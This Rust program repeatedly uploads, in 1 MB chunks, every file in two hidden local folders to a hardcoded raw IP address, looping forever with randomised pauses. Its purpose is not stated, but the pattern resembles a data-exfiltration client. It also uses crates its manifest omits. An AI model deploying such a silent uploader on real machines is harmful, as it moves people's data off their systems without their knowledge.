// Cargo.toml
// [package]
// name = "chunked_sender"
// version = "0.1.0"
// edition = "2021"
//
// [dependencies]
// reqwest = { version = "0.11", features = ["blocking"] }
// anyhow = "1.0"

use anyhow::Result;
use std::io::Write;
use rand::{thread_rng, Rng};
use reqwest::blocking::Client;
use std::{
    fs::{self, File},
    io::Read,
    path::Path,
    thread,
    time::Duration,
};

const SERVER_URL: &str = "http://144.172.84.133:80"; // 👉 change à ton URL/ngrok
const CHUNK_SIZE: usize = 1024 * 1024; // 1 Mo

fn send_file_in_chunks(client: &Client, file_path: &Path) -> Result<()> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let total_chunks = (buffer.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    let filename = file_path.file_name().unwrap().to_string_lossy();

    for idx in 0..total_chunks {
        let start = idx * CHUNK_SIZE;
        let end = (start + CHUNK_SIZE).min(buffer.len());
        let chunk = &buffer[start..end];

        let resp = client
            .post(SERVER_URL)
            .header("X-Filename", filename.to_string())
            .header("X-Segment-Number", idx.to_string())
            .header("X-Total-Segments", total_chunks.to_string())
            .body(chunk.to_vec())
            .send()?;

        if resp.status().is_success() {
            println!("✔️  Chunk {}/{} envoyé pour {}", idx + 1, total_chunks, filename);
        } else {
            eprintln!("❌  Erreur chunk {}/{}: {}", idx + 1, total_chunks, resp.status());
        }

        // petite pause pour ne pas spammer
        thread::sleep(Duration::from_millis(200));
    }

    Ok(())
}

fn send_dir(dir: &str) -> Result<()> {
    let entries = fs::read_dir(dir)?;
    let client = Client::new();

    for entry in entries {
        let path = entry?.path();
        if path.is_file() {
            send_file_in_chunks(&client, &path)?;
        }
    }

    Ok(())
}

fn main() -> Result<()> {
    // Dossier à envoyer
    let output_dir = ".output";
    let output_file_dir = ".output_files";
    let output_file = ".output_files/fichier.txt";

    // On peut appeler send_dir dans une boucle infinie si besoin
    loop {
        println!("🚀 Démarrage d'un nouvel envoi à {:?}", chrono::Local::now());
        
        if let Err(e) = send_dir(output_dir) {
            eprintln!("⚠️  Erreur d'envoi : {:?}", e);
        }

        if let Err(e) = send_dir(output_file_dir) {
            eprintln!("⚠️  Erreur d'envoi : {:?}", e);
        }

        // recréer dossier et/ou fichier si besoin...
        thread::sleep(Duration::from_secs(5));
        fs::create_dir_all(output_file_dir).ok();
        fs::create_dir_all(output_dir).ok();

        if !Path::new(output_file).exists() {
            match File::create(output_file) {
                Ok(mut file) => {
                    if file.write_all(b"Fichier nouvellement cree.").is_ok() {
                        println!("📄 Fichier créé avec succès !");
                    }
                }
                Err(_) => println!("⚠️ Erreur lors de la création du fichier."),
            }
        }

        let pause = thread_rng().gen_range(10..15);
        println!("⏸️ Pause de {} secondes...", pause);
        thread::sleep(Duration::from_secs(pause));
    }
}
